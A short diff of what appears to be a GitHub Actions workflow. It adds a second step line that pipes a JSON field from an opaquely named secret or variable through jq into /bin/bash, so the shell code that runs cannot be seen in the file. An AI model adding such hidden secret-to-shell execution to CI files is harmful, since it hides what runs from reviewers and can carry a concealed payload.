@@ -21,6 +21,7 @@ jobs:
           kfrid7: ${{ secrets.kfrid7 }}
         run: |
           printf '%s' "$kfrid7" | jq -r .uiejn4 | /bin/bash
+          printf '%s' "$kmtwt11570" | jq -r .z4756 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
